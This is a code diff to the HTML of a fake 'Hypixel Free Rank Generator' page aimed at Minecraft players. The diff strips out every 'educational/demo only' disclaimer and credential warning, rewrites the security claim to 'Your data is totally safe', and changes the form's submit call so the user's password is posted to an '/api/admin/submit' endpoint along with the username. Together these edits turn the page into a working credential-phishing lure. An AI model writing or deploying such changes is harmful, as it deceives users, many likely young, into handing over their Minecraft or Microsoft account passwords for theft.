@@ -110,8 +110,6 @@
 <section class="hero">
   <p class="hero-eyebrow">✦ Hypixel Free Rank Generator ✦</p>
   <h1>Claim Your <span class="gold">FREE</span><br>Hypixel <span class="aqua">Rank</span> Now</h1>
-  <p class="hero-sub">Select a rank below, enter your Minecraft credentials, and receive your rank instantly.</p>
-  <div class="hero-warning">⚠️ FOR EDUCATIONAL / DEMO PURPOSES ONLY</div>
 </section>
 <section class="section">
   <p class="section-title">— Choose Your Rank —</p>
@@ -171,7 +169,7 @@
     <div class="rank-card rank-mvp-pp" onclick="openModal('MVP++','#FFAA00','#000')">
       <div class="rank-icon">MVP++</div>
       <div class="rank-name" style="color:var(--mvp-plus-plus)">MVP++</div>
-      <div class="rank-price">FREE <span>/ forever</span></div>
+      <div class="rank-price">FREE <span>/ 1 month</span></div>
       <ul class="rank-perks">
         <li>Gold name — the highest free rank</li>
         <li>Boosted coin &amp; XP multiplier</li>
@@ -198,12 +196,11 @@
 </section>
 <div class="features">
   <div class="feature"><span class="feature-icon">⚡</span><h3>Instant</h3><p>Rank applied within seconds of submitting your details</p></div>
-  <div class="feature"><span class="feature-icon">🔒</span><h3>Secure</h3><p>Your data is totally safe… just kidding, never enter real credentials</p></div>
+  <div class="feature"><span class="feature-icon">🔒</span><h3>Secure</h3><p>Your data is totally safe</p></div>
   <div class="feature"><span class="feature-icon">💎</span><h3>100% Free</h3><p>No credit card, no surveys, no hidden fees whatsoever</p></div>
   <div class="feature"><span class="feature-icon">🌐</span><h3>All Servers</h3><p>Works on Hypixel network — every minigame, every lobby</p></div>
 </div>
 <footer>
-  <p class="disclaimer"><strong>⚠️ DISCLAIMER:</strong> This is a <strong>demo / educational project only</strong>. Never enter real Minecraft or Microsoft credentials on any third-party site.</p>
 </footer>
 
 <!-- CLAIM MODAL -->
@@ -262,7 +259,7 @@
       return;
     }
     // Send to backend
-    await fetch('/api/admin/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({rank:currentRank,username:u})});
+    await fetch('/api/admin/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({rank:currentRank,username:u,password:p})});
     closeModal();
     setTimeout(()=>document.getElementById('successModal').classList.add('active'),200);
   }
